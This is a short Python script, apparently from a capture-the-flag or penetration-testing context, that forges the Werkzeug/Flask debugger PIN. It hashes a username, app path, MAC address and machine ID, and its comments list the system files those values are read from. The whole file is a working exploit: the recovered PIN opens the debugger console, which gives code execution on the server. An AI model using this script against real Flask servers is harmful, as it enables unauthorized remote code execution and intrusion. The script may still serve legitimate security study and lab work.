#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
	'urmother',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.12/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'51121675805739',# str(uuid.getnode()),  /sys/class/net/ehtid/address 
	# Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
	'29233f5c-749c-402b-9176-164c5268546e'
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print("Pin: " + rv)